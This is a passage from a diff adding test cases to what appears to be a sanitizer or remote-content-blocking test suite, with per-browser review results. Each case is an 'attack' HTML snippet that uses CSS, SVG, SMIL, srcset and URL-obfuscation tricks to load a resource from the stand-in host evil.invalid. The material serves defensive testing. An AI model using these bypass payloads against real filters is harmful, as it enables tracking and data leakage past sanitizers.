src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"a.png\"><img src=\"https://evil.invalid/x.png\">",
+  "note": "review 2026-10-10 (round 2): [hand] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 H1 @container with container ancestor + url",
+  "kind": "attack",
+  "html": "<div style=\"container-type:inline-size;width:50px\"><style>@container (min-width:0px){.rv2{background:url(https://evil.invalid/x)}}</style><div class=\"rv2\">x</div></div>",
+  "note": "review 2026-10-10 (round 2): [hand2] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 H2 @font-face format() tech() src url",
+  "kind": "attack",
+  "html": "<style>@font-face{font-family:frv2;src:local(zz),url(https://evil.invalid/x) format(\"woff2\") tech(color-COLRv1)}.rv2{font-family:frv2}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand2] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=0 t=0, firefox c=2 t=0"
+ },
+ {
+  "name": "r2 H3 @font-face plain src url used",
+  "kind": "attack",
+  "html": "<style>@font-face{font-family:frv2;src:url(https://evil.invalid/x)}.rv2{font-family:frv2}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand2] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 H4 image-set string then type()",
+  "kind": "attack",
+  "html": "<style>.rv2{background:image-set(\"https://evil.invalid/x\" type(\"image/png\") 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand2] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 H5 image-set local 2x then evil 1x",
+  "kind": "attack",
+  "html": "<style>.rv2{background:image-set(\"a.png\" 2x,\"https://evil.invalid/x\" 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand2] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 H6 image-set url local then evil string 1x",
+  "kind": "attack",
+  "html": "<style>.rv2{background:image-set(url(a.png) 2x,\"https://evil.invalid/x\" 1x)}</style><div class=\"rv2\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand2] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 H9 svg style with SVG-ns child splitting @import",
+  "kind": "attack",
+  "html": "<svg><style>@imp<x></x>ort \"https://evil.invalid/x\";</style></svg>",
+  "note": "review 2026-10-10 (round 2): [hand2] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 H11 svg style: url( split by svg child",
+  "kind": "attack",
+  "html": "<svg width=\"20\" height=\"20\"><style>.rv2{fill:url(<x></x>https://evil.invalid/x)}</style><rect class=\"rv2\" width=\"10\" height=\"10\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand2] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=0 t=0, firefox c=0 t=0"
+ },
+ {
+  "name": "r2 H15 SMIL set mask remote",
+  "kind": "attack",
+  "html": "<svg><rect width=\"10\" height=\"10\"><set attributeName=\"mask\" to=\"url(https://evil.invalid/x.svg#f)\" begin=\"0s\"/></rect></svg>",
+  "note": "review 2026-10-10 (round 2): [hand2] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=2 t=0"
+ },
+ {
+  "name": "r2 H16 SMIL set cursor url remote",
+  "kind": "attack",
+  "html": "<svg><rect width=\"10\" height=\"10\"><set attributeName=\"cursor\" to=\"url(https://evil.invalid/x),auto\" begin=\"0s\"/></rect></svg>",
+  "note": "review 2026-10-10 (round 2): [hand2] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 H17 SMIL set filter, ref with CSS escape and comment",
+  "kind": "attack",
+  "html": "<svg><rect width=\"10\" height=\"10\"><set attributeName=\"filter\" to=\"u\\72l(https://evil.invalid/x.svg#f)\" begin=\"0s\"/></rect></svg>",
+  "note": "review 2026-10-10 (round 2): [hand2] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=0 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 H20 img srcset comma-less",
+  "kind": "attack",
+  "html": "<img src=\"a.png\" srcset=\"//evil.invalid/x\">",
+  "note": "review 2026-10-10 (round 2): [hand2] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 H20 img srcset leading comma",
+  "kind": "attack",
+  "html": "<img src=\"a.png\" srcset=\",//evil.invalid/x 1x\">",
+  "note": "review 2026-10-10 (round 2): [hand2] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 H20 img srcset uppercase scheme",
+  "kind": "attack",
+  "html": "<img src=\"a.png\" srcset=\"a.png 2x, HTTPS://evil.invalid/x 1x\">",
+  "note": "review 2026-10-10 (round 2): [hand2] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 H20 img srcset comma inside url (path with comma)",
+  "kind": "attack",
+  "html": "<img src=\"a.png\" srcset=\"a.png 2x,//evil.invalid/x,y 1x\">",
+  "note": "review 2026-10-10 (round 2): [hand2] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 H20 img srcset trailing commas",
+  "kind": "attack",
+  "html": "<img src=\"a.png\" srcset=\"a.png 2x,//evil.invalid/x,, 1x\">",
+  "note": "review 2026-10-10 (round 2): [hand2] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 H21 source srcset in picture with sizes",
+  "kind": "attack",
+  "html": "<picture><source srcset=\"//evil.invalid/x 1x\" sizes=\"10px\"><img src=\"a.png\"></picture>",
+  "note": "review 2026-10-10 (round 2): [hand2] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 H23 img with both src and srcset remote, alt contains parens",
+  "kind": "attack",
+  "html": "<img src=\"//evil.invalid/x\" alt=\"a (b) c\">",
+  "note": "review 2026-10-10 (round 2): [hand2] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I img src tab after slash",
+  "kind": "attack",
+  "html": "<img src=\"/&#9;/evil.invalid/x\">",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I svg image href tab after slash",
+  "kind": "attack",
+  "html": "<svg width=\"20\" height=\"20\"><image width=\"10\" height=\"10\" href=\"/&#9;/evil.invalid/x\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I css url() tab after slash",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url(&quot;/&#9;/evil.invalid/x&quot;)\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I img src lf after slash",
+  "kind": "attack",
+  "html": "<img src=\"/&#10;/evil.invalid/x\">",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I svg image href lf after slash",
+  "kind": "attack",
+  "html": "<svg width=\"20\" height=\"20\"><image width=\"10\" height=\"10\" href=\"/&#10;/evil.invalid/x\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I img src cr after slash",
+  "kind": "attack",
+  "html": "<img src=\"/&#13;/evil.invalid/x\">",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I svg image href cr after slash",
+  "kind": "attack",
+  "html": "<svg width=\"20\" height=\"20\"><image width=\"10\" height=\"10\" href=\"/&#13;/evil.invalid/x\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I img src leading tab",
+  "kind": "attack",
+  "html": "<img src=\"&#9;//evil.invalid/x\">",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I svg image href leading tab",
+  "kind": "attack",
+  "html": "<svg width=\"20\" height=\"20\"><image width=\"10\" height=\"10\" href=\"&#9;//evil.invalid/x\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I css url() leading tab",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url(&quot;&#9;//evil.invalid/x&quot;)\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I img src leading C0 0x01",
+  "kind": "attack",
+  "html": "<img src=\"&#1;//evil.invalid/x\">",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I svg image href leading C0 0x01",
+  "kind": "attack",
+  "html": "<svg width=\"20\" height=\"20\"><image width=\"10\" height=\"10\" href=\"&#1;//evil.invalid/x\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I css url() leading C0 0x01",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url(&quot;&#1;//evil.invalid/x&quot;)\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I img src leading vt",
+  "kind": "attack",
+  "html": "<img src=\"&#11;//evil.invalid/x\">",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I svg image href leading vt",
+  "kind": "attack",
+  "html": "<svg width=\"20\" height=\"20\"><image width=\"10\" height=\"10\" href=\"&#11;//evil.invalid/x\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I css url() leading vt",
+  "kind": "attack",
+  "html": "<div class=\"rv2\" style=\"background:url(&quot;&#11;//evil.invalid/x&quot;)\">x</div>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I img src leading ff",
+  "kind": "attack",
+  "html": "<img src=\"&#12;//evil.invalid/x\">",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I svg image href leading ff",
+  "kind": "attack",
+  "html": "<svg width=\"20\" height=\"20\"><image width=\"10\" height=\"10\" href=\"&#12;//evil.invalid/x\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I img src backslash after scheme",
+  "kind": "attack",
+  "html": "<img src=\"https:\\\\evil.invalid/x\">",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I svg image href backslash after scheme",
+  "kind": "attack",
+  "html": "<svg width=\"20\" height=\"20\"><image width=\"10\" height=\"10\" href=\"https:\\\\evil.invalid/x\"/></svg>",
+  "note": "review 2026-10-10 (round 2): [hand3] abgewehrt (Kontrolle lud, Behandlung nicht) | chrome c=1 t=0, webkit c=1 t=0, firefox c=1 t=0"
+ },
+ {
+  "name": "r2 I img src slash backslash",
+  "kind": "attack",
+  "html": "<img src=\"/\\evil.invalid/x\">",
